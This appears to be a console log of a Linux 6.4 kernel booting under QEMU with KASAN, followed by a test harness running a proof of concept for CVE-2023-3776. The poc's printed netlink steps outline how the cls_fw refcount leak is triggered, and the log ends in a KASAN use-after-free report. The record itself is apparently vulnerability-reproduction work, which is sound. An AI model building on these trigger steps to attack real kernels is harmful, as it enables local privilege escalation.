bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
c[?7l[2J[0mSeaBIOS (version 1.16.2-debian-1.16.2-1)


iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+7EFCEF00+7EF0EF00 CA00
Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               


Booting from ROM..c[?7l[2J[    0.000000] Linux version 6.4.0-12002-g525c469e5de9-dirty (root@buildkitsandbox) (gcc (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Tue May  5 10:33:37 UTC 2026
[    0.000000] Command line: console=ttyS0 oops=panic nokaslr rdinit=/init
[    0.000000] BIOS-provided physical RAM map:
[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
[    0.000000] BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000007ffdffff] usable
[    0.000000] BIOS-e820: [mem 0x000000007ffe0000-0x000000007fffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000feffc000-0x00000000feffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved
[    0.000000] NX (Execute Disable) protection: active
[    0.000000] SMBIOS 2.8 present.
[    0.000000] DMI: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    0.000000] Hypervisor detected: KVM
[    0.000000] kvm-clock: Using msrs 4b564d01 and 4b564d00
[    0.000000] kvm-clock: using sched offset of 237346182 cycles
[    0.000003] clocksource: kvm-clock: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns
[    0.000005] tsc: Detected 3187.200 MHz processor
[    0.000320] last_pfn = 0x7ffe0 max_arch_pfn = 0x400000000
[    0.000339] MTRR map: 4 entries (3 fixed + 1 variable; max 19), built from 8 variable MTRRs
[    0.000341] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  
[    0.002283] found SMP MP-table at [mem 0x000f5ba0-0x000f5baf]
[    0.002295] Using GB pages for direct mapping
[    0.002296] Incomplete global flushes, disabling PCID
[    0.002380] RAMDISK: [mem 0x7fe92000-0x7ffdffff]
[    0.002384] ACPI: Early table checksum verification disabled
[    0.002387] ACPI: RSDP 0x00000000000F59D0 000014 (v00 BOCHS )
[    0.002389] ACPI: RSDT 0x000000007FFE1B33 000034 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002394] ACPI: FACP 0x000000007FFE19DF 000074 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002398] ACPI: DSDT 0x000000007FFE0040 00199F (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002400] ACPI: FACS 0x000000007FFE0000 000040
[    0.002401] ACPI: APIC 0x000000007FFE1A53 000080 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002402] ACPI: HPET 0x000000007FFE1AD3 000038 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002404] ACPI: WAET 0x000000007FFE1B0B 000028 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002405] ACPI: Reserving FACP table memory at [mem 0x7ffe19df-0x7ffe1a52]
[    0.002406] ACPI: Reserving DSDT table memory at [mem 0x7ffe0040-0x7ffe19de]
[    0.002407] ACPI: Reserving FACS table memory at [mem 0x7ffe0000-0x7ffe003f]
[    0.002407] ACPI: Reserving APIC table memory at [mem 0x7ffe1a53-0x7ffe1ad2]
[    0.002408] ACPI: Reserving HPET table memory at [mem 0x7ffe1ad3-0x7ffe1b0a]
[    0.002408] ACPI: Reserving WAET table memory at [mem 0x7ffe1b0b-0x7ffe1b32]
[    0.002588] No NUMA configuration found
[    0.002589] Faking a node at [mem 0x0000000000000000-0x000000007ffdffff]
[    0.002591] NODE_DATA(0) allocated [mem 0x7fe8e000-0x7fe91fff]
[    0.002600] Zone ranges:
[    0.002600]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]
[    0.002601]   DMA32    [mem 0x0000000001000000-0x000000007ffdffff]
[    0.002602]   Normal   empty
[    0.002603] Movable zone start for each node
[    0.002603] Early memory node ranges
[    0.002603]   node   0: [mem 0x0000000000001000-0x000000000009efff]
[    0.002604]   node   0: [mem 0x0000000000100000-0x000000007ffdffff]
[    0.002605] Initmem setup node 0 [mem 0x0000000000001000-0x000000007ffdffff]
[    0.002782] On node 0, zone DMA: 1 pages in unavailable ranges
[    0.002819] On node 0, zone DMA: 97 pages in unavailable ranges
[    0.009291] On node 0, zone DMA32: 32 pages in unavailable ranges
[    0.037184] kasan: KernelAddressSanitizer initialized
[    0.037397] ACPI: PM-Timer IO Port: 0x608
[    0.037403] ACPI: LAPIC_NMI (acpi_id[0xff] dfl dfl lint[0x1])
[    0.037431] IOAPIC[0]: apic_id 0, version 17, address 0xfec00000, GSI 0-23
[    0.037433] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
[    0.037435] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 high level)
[    0.037435] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 high level)
[    0.037436] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 high level)
[    0.037437] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 high level)
[    0.037439] ACPI: Using ACPI (MADT) for SMP configuration information
[    0.037440] ACPI: HPET id: 0x8086a201 base: 0xfed00000
[    0.037441] TSC deadline timer available
[    0.037442] smpboot: Allowing 2 CPUs, 0 hotplug CPUs
[    0.037458] kvm-guest: KVM setup pv remote TLB flush
[    0.037460] kvm-guest: setup PV sched yield
[    0.037465] PM: hibernation: Registered nosave memory: [mem 0x00000000-0x00000fff]
[    0.037466] PM: hibernation: Registered nosave memory: [mem 0x0009f000-0x0009ffff]
[    0.037467] PM: hibernation: Registered nosave memory: [mem 0x000a0000-0x000effff]
[    0.037467] PM: hibernation: Registered nosave memory: [mem 0x000f0000-0x000fffff]
[    0.037469] [mem 0x80000000-0xfeffbfff] available for PCI devices
[    0.037470] Booting paravirtualized kernel on KVM
[    0.037471] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1910969940391419 ns
[    0.045598] setup_percpu: NR_CPUS:64 nr_cpumask_bits:2 nr_cpu_ids:2 nr_node_ids:1
[    0.045850] percpu: Embedded 66 pages/cpu s232104 r8192 d30040 u1048576
[    0.045878] Kernel command line: console=ttyS0 oops=panic nokaslr rdinit=/init
[    0.045926] random: crng init done
[    0.046134] Dentry cache hash table entries: 262144 (order: 9, 2097152 bytes, linear)
[    0.046308] Inode-cache hash table entries: 131072 (order: 8, 1048576 bytes, linear)
[    0.046345] Fallback order for Node 0: 0 
[    0.046347] Built 1 zonelists, mobility grouping on.  Total pages: 515808
[    0.046348] Policy zone: DMA32
[    0.046349] mem auto-init: stack:all(zero), heap alloc:off, heap free:off
[    0.046350] stackdepot: allocating hash table via alloc_large_system_hash
[    0.047202] stackdepot hash table entries: 1048576 (order: 11, 8388608 bytes, linear)
[    0.067352] Memory: 1692960K/2096632K available (49152K kernel code, 7980K rwdata, 10184K rodata, 5648K init, 2900K bss, 403416K reserved, 0K cma-reserved)
[    0.067461] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=2, Nodes=1
[    0.068380] Dynamic Preempt: voluntary
[    0.068595] rcu: Preemptible hierarchical RCU implementation.
[    0.068596] rcu: 	RCU event tracing is enabled.
[    0.068596] rcu: 	RCU restricting CPUs from NR_CPUS=64 to nr_cpu_ids=2.
[    0.068598] 	Trampoline variant of Tasks RCU enabled.
[    0.068598] rcu: RCU calculated value of scheduler-enlistment delay is 100 jiffies.
[    0.068599] rcu: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=2
[    0.074628] NR_IRQS: 4352, nr_irqs: 440, preallocated irqs: 16
[    0.074833] rcu: srcu_init: Setting srcu_struct sizes based on contention.
[    0.077109] Console: colour VGA+ 80x25
[    0.077134] printk: console [ttyS0] enabled
[    0.114977] ACPI: Core revision 20230331
[    0.115339] clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604467 ns
[    0.115928] APIC: Switch to symmetric I/O mode setup
[    0.116218] kvm-guest: setup PV IPIs
[    0.117057] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=-1 pin2=-1
[    0.117407] clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x2df10e7656b, max_idle_ns: 440795364873 ns
[    0.118029] Calibrating delay loop (skipped) preset value.. 6374.40 BogoMIPS (lpj=3187200)
[    0.118581] x86/cpu: User Mode Instruction Prevention (UMIP) activated
[    0.119076] Last level iTLB entries: 4KB 0, 2MB 0, 4MB 0
[    0.119382] Last level dTLB entries: 4KB 0, 2MB 0, 4MB 0, 1GB 0
[    0.119727] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization
[    0.120026] Spectre V2 : Mitigation: Enhanced / Automatic IBRS
[    0.120365] Spectre V2 : Spectre v2 / SpectreRSB mitigation: Filling RSB on context switch
[    0.121024] Spectre V2 : Spectre v2 / PBRSB-eIBRS: Retire a single CALL on VMEXIT
[    0.121457] Spectre V2 : mitigation: Enabling conditional Indirect Branch Prediction Barrier
[    0.122025] Speculative Store Bypass: Mitigation: Speculative Store Bypass disabled via prctl
[    0.122517] MMIO Stale Data: Unknown: No mitigations
[    0.122815] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
[    0.123024] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
[    0.123402] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
[    0.124025] x86/fpu: Supporting XSAVE feature 0x200: 'Protection Keys User registers'
[    0.124489] x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
[    0.124856] x86/fpu: xstate_offset[9]:  832, xstate_sizes[9]:    8
[    0.125024] x86/fpu: Enabled xstate features 0x207, context size is 840 bytes, using 'compacted' format.
[    0.141016] Freeing SMP alternatives memory: 44K
[    0.141331] pid_max: default: 32768 minimum: 301
[    0.141648] LSM: initializing lsm=capability,selinux,integrity
[    0.142001] SELinux:  Initializing.
[    0.142086] Mount-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.142529] Mountpoint-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.143578] smpboot: CPU0: Intel(R) Core(TM) i9-14900K (family: 0x6, model: 0xb7, stepping: 0x1)
[    0.144024] RCU Tasks: Setting shift to 1 and lim to 1 rcu_task_cb_adjust=1.
[    0.144047] Performance Events: unsupported p6 CPU model 183 no PMU driver, software events only.
[    0.144574] signal: max sigframe size: 3632
[    0.144846] rcu: Hierarchical SRCU implementation.
[    0.145026] rcu: 	Max phase no-delay instances is 400.
[    0.145678] smp: Bringing up secondary CPUs ...
[    0.146077] smpboot: x86: Booting SMP configuration:
[    0.146376] .... node  #0, CPUs:      #1
[    0.146459] smp: Brought up 1 node, 2 CPUs
[    0.147028] smpboot: Max logical packages: 1
[    0.147287] smpboot: Total of 2 processors activated (12748.80 BogoMIPS)
[    0.148027] devtmpfs: initialized
[    0.149789] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1911260446275000 ns
[    0.150028] futex hash table entries: 512 (order: 3, 32768 bytes, linear)
[    0.150540] PM: RTC time: 10:36:27, date: 2026-05-05
[    0.150954] NET: Registered PF_NETLINK/PF_ROUTE protocol family
[    0.151240] audit: initializing netlink subsys (disabled)
[    0.151608] audit: type=2000 audit(1777977387.839:1): state=initialized audit_enabled=0 res=1
[    0.151608] thermal_sys: Registered thermal governor 'step_wise'
[    0.152029] thermal_sys: Registered thermal governor 'user_space'
[    0.152395] cpuidle: using governor menu
[    0.153171] PCI: Using configuration type 1 for base access
[    0.153630] kprobes: kprobe jump-optimization is enabled. All kprobes are optimized if possible.
[    0.156024] HugeTLB: registered 2.00 MiB page size, pre-allocated 0 pages
[    0.157030] HugeTLB: 28 KiB vmemmap can be freed for a 2.00 MiB page
[    0.158418] ACPI: Added _OSI(Module Device)
[    0.159031] ACPI: Added _OSI(Processor Device)
[    0.159824] ACPI: Added _OSI(3.0 _SCP Extensions)
[    0.160028] ACPI: Added _OSI(Processor Aggregator Device)
[    0.166151] ACPI: 1 ACPI AML tables successfully acquired and loaded
[    0.208378] ACPI: Interpreter enabled
[    0.208655] ACPI: PM: (supports S0 S3 S4 S5)
[    0.208908] ACPI: Using IOAPIC for interrupt routing
[    0.209057] PCI: Using host bridge windows from ACPI; if necessary, use "pci=nocrs" and report a bug
[    0.209597] PCI: Using E820 reservations for host bridge windows
[    0.210289] ACPI: Enabled 2 GPEs in block 00 to 0F
[    0.220045] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])
[    0.220433] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI HPX-Type3]
[    0.220917] acpi PNP0A03:00: _OSC: not requesting OS control; OS requires [ExtendedConfig ASPM ClockPM MSI]
[    0.221072] acpi PNP0A03:00: fail to add MMCONFIG information, can't access extended configuration space under this bridge
[    0.221905] PCI host bridge to bus 0000:00
[    0.222027] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]
[    0.222443] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]
[    0.222859] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]
[    0.223027] pci_bus 0000:00: root bus resource [mem 0x80000000-0xfebfffff window]
[    0.223484] pci_bus 0000:00: root bus resource [mem 0x100000000-0x17fffffff window]
[    0.223944] pci_bus 0000:00: root bus resource [bus 00-ff]
[    0.224077] pci 0000:00:00.0: [8086:1237] type 00 class 0x060000
[    0.228217] pci 0000:00:01.0: [8086:7000] type 00 class 0x060100
[    0.232535] pci 0000:00:01.1: [8086:7010] type 00 class 0x010180
[    0.233759] pci 0000:00:01.1: reg 0x20: [io  0xc040-0xc04f]
[    0.234383] pci 0000:00:01.1: legacy IDE quirk: reg 0x10: [io  0x01f0-0x01f7]
[    0.234804] pci 0000:00:01.1: legacy IDE quirk: reg 0x14: [io  0x03f6]
[    0.235025] pci 0000:00:01.1: legacy IDE quirk: reg 0x18: [io  0x0170-0x0177]
[    0.235452] pci 0000:00:01.1: legacy IDE quirk: reg 0x1c: [io  0x0376]
[    0.236014] pci 0000:00:01.3: [8086:7113] type 00 class 0x068000
[    0.236262] pci 0000:00:01.3: quirk: [io  0x0600-0x063f] claimed by PIIX4 ACPI
[    0.236701] pci 0000:00:01.3: quirk: [io  0x0700-0x070f] claimed by PIIX4 SMB
[    0.237183] pci 0000:00:02.0: [1234:1111] type 00 class 0x030000
[    0.238034] pci 0000:00:02.0: reg 0x10: [mem 0xfd000000-0xfdffffff pref]
[    0.239317] pci 0000:00:02.0: reg 0x18: [mem 0xfebf0000-0xfebf0fff]
[    0.241482] pci 0000:00:02.0: reg 0x30: [mem 0xfebe0000-0xfebeffff pref]
[    0.242085] pci 0000:00:02.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]
[    0.246378] pci 0000:00:03.0: [8086:100e] type 00 class 0x020000
[    0.247383] pci 0000:00:03.0: reg 0x10: [mem 0xfebc0000-0xfebdffff]
[    0.248672] pci 0000:00:03.0: reg 0x14: [io  0xc000-0xc03f]
[    0.251797] pci 0000:00:03.0: reg 0x30: [mem 0xfeb80000-0xfebbffff pref]
[    0.258563] ACPI: PCI: Interrupt link LNKA configured for IRQ 10
[    0.259302] ACPI: PCI: Interrupt link LNKB configured for IRQ 10
[    0.260137] ACPI: PCI: Interrupt link LNKC configured for IRQ 11
[    0.260866] ACPI: PCI: Interrupt link LNKD configured for IRQ 11
[    0.261169] ACPI: PCI: Interrupt link LNKS configured for IRQ 9
[    0.262499] iommu: Default domain type: Translated
[    0.262796] iommu: DMA domain TLB invalidation policy: lazy mode
[    0.263201] SCSI subsystem initialized
[    0.263448] ACPI: bus type USB registered
[    0.264076] usbcore: registered new interface driver usbfs
[    0.265054] usbcore: registered new interface driver hub
[    0.266028] usbcore: registered new device driver usb
[    0.267000] pps_core: LinuxPPS API ver. 1 registered
[    0.268029] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti <giometti@linux.it>
[    0.268981] PTP clock support registered
[    0.269164] Advanced Linux Sound Architecture Driver Initialized.
[    0.270377] NetLabel: Initializing
[    0.270590] NetLabel:  domain hash size = 128
[    0.270859] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO
[    0.271061] NetLabel:  unlabeled traffic allowed by default
[    0.272071] PCI: Using ACPI for IRQ routing
[    0.272402] pci 0000:00:02.0: vgaarb: setting as boot VGA device
[    0.272440] pci 0000:00:02.0: vgaarb: bridge control possible
[    0.272824] pci 0000:00:02.0: vgaarb: VGA device added: decodes=io+mem,owns=io+mem,locks=none
[    0.274027] vgaarb: loaded
[    0.274269] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0
[    0.274564] hpet0: 3 comparators, 64-bit 100.000000 MHz counter
[    0.277073] clocksource: Switched to clocksource kvm-clock
[    0.301825] VFS: Disk quotas dquot_6.6.0
[    0.302096] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    0.302606] pnp: PnP ACPI init
[    0.303809] pnp: PnP ACPI: found 6 devices
[    0.311664] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns
[    0.312220] NET: Registered PF_INET protocol family
[    0.312561] IP idents hash table entries: 32768 (order: 6, 262144 bytes, linear)
[    0.313355] tcp_listen_portaddr_hash hash table entries: 1024 (order: 2, 16384 bytes, linear)
[    0.313866] Table-perturb hash table entries: 65536 (order: 6, 262144 bytes, linear)
[    0.314333] TCP established hash table entries: 16384 (order: 5, 131072 bytes, linear)
[    0.314804] TCP bind hash table entries: 16384 (order: 7, 524288 bytes, linear)
[    0.315247] TCP: Hash tables configured (established 16384 bind 16384)
[    0.315812] UDP hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    0.316210] UDP-Lite hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    0.316685] NET: Registered PF_UNIX/PF_LOCAL protocol family
[    0.317298] RPC: Registered named UNIX socket transport module.
[    0.317658] RPC: Registered udp transport module.
[    0.317931] RPC: Registered tcp transport module.
[    0.318212] RPC: Registered tcp-with-tls transport module.
[    0.318539] RPC: Registered tcp NFSv4.1 backchannel transport module.
[    0.319248] pci_bus 0000:00: resource 4 [io  0x0000-0x0cf7 window]
[    0.319619] pci_bus 0000:00: resource 5 [io  0x0d00-0xffff window]
[    0.319974] pci_bus 0000:00: resource 6 [mem 0x000a0000-0x000bffff window]
[    0.320373] pci_bus 0000:00: resource 7 [mem 0x80000000-0xfebfffff window]
[    0.320770] pci_bus 0000:00: resource 8 [mem 0x100000000-0x17fffffff window]
[    0.321262] pci 0000:00:01.0: PIIX3: Enabling Passive Release
[    0.321601] pci 0000:00:00.0: Limiting direct PCI/PCI transfers
[    0.321973] PCI: CLS 0 bytes, default 64
[    0.322301] Unpacking initramfs...
[    0.327265] RAPL PMU: API unit is 2^-32 Joules, 0 fixed counters, 10737418240 ms ovfl timer
[    0.327768] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2df10e7656b, max_idle_ns: 440795364873 ns
[    0.329629] Initialise system trusted keyrings
[    0.329950] workingset: timestamp_bits=56 max_order=19 bucket_order=0
[    0.330615] NFS: Registering the id_resolver key type
[    0.330925] Key type id_resolver registered
[    0.331177] Key type id_legacy registered
[    0.331462] 9p: Installing v9fs 9p2000 file system support
[    0.335356] Freeing initrd memory: 1336K
[    0.336547] Key type asymmetric registered
[    0.336827] Asymmetric key parser 'x509' registered
[    0.337136] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 251)
[    0.337590] io scheduler mq-deadline registered
[    0.337854] io scheduler kyber registered
[    0.338259] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input0
[    0.338785] ACPI: button: Power Button [PWRF]
[    0.339351] Serial: 8250/16550 driver, 4 ports, IRQ sharing enabled
[    0.339890] 00:04: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A
[    0.341033] Non-volatile memory driver v1.3
[    0.341285] Linux agpgart interface v0.103
[    0.341601] ACPI: bus type drm_connector registered
[    0.344624] loop: module loaded
[    0.345831] scsi host0: ata_piix
[    0.346225] scsi host1: ata_piix
[    0.346494] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc040 irq 14
[    0.346890] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc048 irq 15
[    0.347693] e100: Intel(R) PRO/100 Network Driver
[    0.347968] e100: Copyright(c) 1999-2006 Intel Corporation
[    0.348298] e1000: Intel(R) PRO/1000 Network Driver
[    0.348584] e1000: Copyright (c) 1999-2006 Intel Corporation.
[    0.500482] ata2: found unknown device (class 0)
[    0.501095] ata2.00: ATAPI: QEMU DVD-ROM, 2.5+, max UDMA/100
[    0.502023] scsi 1:0:0:0: CD-ROM            QEMU     QEMU DVD-ROM     2.5+ PQ: 0 ANSI: 5
[    0.545462] sr 1:0:0:0: [sr0] scsi3-mmc drive: 4x/4x cd/rw xa/form2 tray
[    0.545866] cdrom: Uniform CD-ROM driver Revision: 3.20
[    0.639798] ACPI: \_SB_.LNKC: Enabled at IRQ 11
[    0.929658] e1000 0000:00:03.0 eth0: (PCI:33MHz:32-bit) 52:54:00:12:34:56
[    0.930070] e1000 0000:00:03.0 eth0: Intel(R) PRO/1000 Network Connection
[    0.930498] e1000e: Intel(R) PRO/1000 Network Driver
[    0.930787] e1000e: Copyright(c) 1999 - 2015 Intel Corporation.
[    0.931148] sky2: driver version 1.30
[    0.931797] usbcore: registered new interface driver usblp
[    0.932124] usbcore: registered new interface driver usb-storage
[    0.932531] i8042: PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 irq 1,12
[    0.933446] serio: i8042 KBD port at 0x60,0x64 irq 1
[    0.933745] serio: i8042 AUX port at 0x60,0x64 irq 12
[    0.934444] rtc_cmos 00:05: RTC can wake from S4
[    0.934962] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input1
[    0.936503] rtc_cmos 00:05: registered as rtc0
[    0.936834] rtc_cmos 00:05: alarms up to one day, y3k, 242 bytes nvram, hpet irqs
[    0.937640] device-mapper: ioctl: 4.48.0-ioctl (2023-03-01) initialised: dm-devel@redhat.com
[    0.938128] intel_pstate: CPU model not supported
[    0.938431] hid: raw HID events driver (C) Jiri Kosina
[    0.938941] usbcore: registered new interface driver usbhid
[    0.939266] usbhid: USB HID core driver
[    0.940091] Initializing XFRM netlink socket
[    0.940392] NET: Registered PF_INET6 protocol family
[    0.941006] Segment Routing with IPv6
[    0.941237] In-situ OAM (IOAM) with IPv6
[    0.941506] sit: IPv6, IPv4 and MPLS over IPv4 tunneling driver
[    0.942082] NET: Registered PF_PACKET protocol family
[    0.942423] 9pnet: Installing 9P2000 support
[    0.942695] Key type dns_resolver registered
[    0.943180] IPI shorthand broadcast: enabled
[    0.950357] sched_clock: Marking stable (909001105, 41184298)->(959412711, -9227308)
[    0.950996] registered taskstats version 1
[    0.951258] Loading compiled-in X.509 certificates
[    0.957127] PM:   Magic number: 10:10:628
[    0.957416] printk: console [netcon0] enabled
[    0.957684] netconsole: network logging started
[    0.958034] cfg80211: Loading compiled-in X.509 certificates for regulatory database
[    0.958665] kworker/u4:1 (51) used greatest stack depth: 29552 bytes left
[    0.959265] Loaded X.509 cert 'sforshee: 00b28ddf47aef9cea7'
[    0.959653] platform regulatory.0: Direct firmware load for regulatory.db failed with error -2
[    0.960179] cfg80211: failed to load regulatory.db
[    0.960497] ALSA device list:
[    0.960683]   No soundcards found.
[    0.961651] Freeing unused kernel image (initmem) memory: 5648K
[    0.966236] Write protecting the kernel read-only data: 59392k
[    0.966538] Freeing unused kernel image (rodata/data gap) memory: 56K
[    0.974343] x86/mm: Checked W+X mappings: passed, no W+X pages found.
[    0.974661] Run /init as init process
[    0.976007] mount (55) used greatest stack depth: 28760 bytes left

secb: rootfs ready
---- poc begin ----
poc: start: CVE-2023-3776 cls_fw refcnt leak (tcf_change_indev failure)
poc: NEWQDISC drr 1:0 rc=0
poc: NEWTCLASS drr 1:10 rc=0
poc: NEWTFILTER fw add (handle=1, -> 1:10) rc=0
poc: CHANGE fw (indev=loo, classid=1:20) rc=-19 (expect != 0)
poc: DELTCLASS 1:10 rc=0
[    1.558717] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input3
[    1.982449] poc (61) used greatest stack depth: 27504 bytes left
poc: done — KASAN should have fired by now
---- poc end rc=0 ----
secb: poc exited without crashing the kernel
[    2.003519] ==================================================================
[    2.005041] BUG: KASAN: slab-use-after-free in drr_unbind_tcf+0x38/0x50
[    2.006478] Read of size 4 at addr ffff888009d8ee18 by task kworker/u4:1/25
[    2.007907] 
[    2.008255] CPU: 1 PID: 25 Comm: kworker/u4:1 Not tainted 6.4.0-12002-g525c469e5de9-dirty #1
[    2.009972] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    2.011890] Workqueue: netns cleanup_net
[    2.012676] Call Trace:
[    2.013153]  <TASK>
[    2.013579]  dump_stack_lvl+0x36/0x50
[    2.014279]  print_report+0xcf/0x660
[    2.014972]  ? drr_unbind_tcf+0x38/0x50
[    2.015705]  kasan_report+0xc7/0x100
[    2.016389]  ? drr_unbind_tcf+0x38/0x50
[    2.017116]  drr_unbind_tcf+0x38/0x50
[    2.018374]  fw_destroy+0x245/0x540
[    2.018908]  ? __pfx_fw_destroy+0x10/0x10
[    2.019346]  ? mutex_lock+0x8d/0xe0
[    2.019739]  ? __pfx_mutex_lock+0x10/0x10
[    2.020172]  tcf_proto_destroy+0x69/0x2c0
[    2.020623]  tcf_chain_flush+0x183/0x2e0
[    2.021051]  __tcf_block_put+0xf3/0x2b0
[    2.021472]  ? tcf_block_put+0xb8/0x110
[    2.021904]  ? __kmem_cache_free+0x82/0x1c0
[    2.022360]  tcf_block_put+0xcb/0x110
[    2.022773]  ? __pfx_tcf_block_put+0x10/0x10
[    2.023307]  ? __pfx_autoremove_wake_function+0x10/0x10
[    2.023716]  drr_destroy_qdisc+0x43/0x1a0
[    2.023993]  __qdisc_destroy+0x96/0x260
[    2.024258]  dev_shutdown+0x1f8/0x360
[    2.024515]  unregister_netdevice_many_notify+0x65a/0x1450
[    2.024887]  ? __pfx_unregister_netdevice_many_notify+0x10/0x10
[    2.025288]  ? unregister_netdevice_queue+0x68/0x280
[    2.025632]  ? __pfx_unregister_netdevice_queue+0x10/0x10
[    2.025998]  ? __pfx_mutex_lock+0x10/0x10
[    2.026274]  ? __pfx_netdev_run_todo+0x10/0x10
[    2.026583]  default_device_exit_batch+0x392/0x500
[    2.026910]  ? __pfx_default_device_exit_batch+0x10/0x10
[    2.027270]  ? ops_exit_list+0x91/0x140
[    2.027538]  cleanup_net+0x3b3/0x980
[    2.027787]  ? __pfx_cleanup_net+0x10/0x10
[    2.028067]  ? _raw_spin_lock_irq+0x81/0xe0
[    2.028354]  ? read_word_at_a_time+0xe/0x20
[    2.028644]  ? strscpy+0xad/0x290
[    2.028876]  process_one_work+0x801/0x1500
[    2.029159]  worker_thread+0xed/0x1390
[    2.029389]  ? __pfx_worker_thread+0x10/0x10
[    2.029602]  kthread+0x29b/0x370
[    2.029764]  ? __pfx_kthread+0x10/0x10
[    2.029950]  ret_from_fork+0x29/0x50
[    2.030128]  </TASK>
[    2.030241] 
[    2.030322] Allocated by task 61:
[    2.030488]  kasan_save_stack+0x33/0x60
[    2.030683]  kasan_set_track+0x25/0x30
[    2.030869]  __kasan_kmalloc+0x8f/0xa0
[    2.031054]  drr_change_class+0x36c/0xac0
[    2.031251]  tc_ctl_tclass+0x3cf/0xf40
[    2.031436]  rtnetlink_rcv_msg+0x35d/0x9d0
[    2.031640]  netlink_rcv_skb+0x12f/0x370
[    2.031832]  netlink_unicast+0x588/0x7f0
[    2.032025]  netlink_sendmsg+0x7b7/0xc60
[    2.032217]  sock_sendmsg+0x13d/0x180
[    2.032399]  ____sys_sendmsg+0x5c5/0x7f0
[    2.032595]  ___sys_sendmsg+0x100/0x180
[    2.032785]  __sys_sendmsg+0xe6/0x190
[    2.032966]  do_syscall_64+0x3b/0x90
[    2.033143]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
[    2.033390] 
[    2.033471] Freed by task 61:
[    2.033623]  kasan_save_stack+0x33/0x60
[    2.033812]  kasan_set_track+0x25/0x30
[    2.033997]  kasan_save_free_info+0x2b/0x50
[    2.034202]  __kasan_slab_free+0x10a/0x180
[    2.034403]  __kmem_cache_free+0x82/0x1c0
[    2.034601]  drr_delete_class+0x2b8/0x420
[    2.034799]  tc_ctl_tclass+0x9af/0xf40
[    2.034988]  rtnetlink_rcv_msg+0x35d/0x9d0
[    2.035193]  netlink_rcv_skb+0x12f/0x370
[    2.035391]  netlink_unicast+0x588/0x7f0
[    2.035589]  netlink_sendmsg+0x7b7/0xc60
[    2.035786]  sock_sendmsg+0x13d/0x180
[    2.035971]  ____sys_sendmsg+0x5c5/0x7f0
[    2.036169]  ___sys_sendmsg+0x100/0x180
[    2.036362]  __sys_sendmsg+0xe6/0x190
[    2.036549]  do_syscall_64+0x3b/0x90
[    2.036730]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
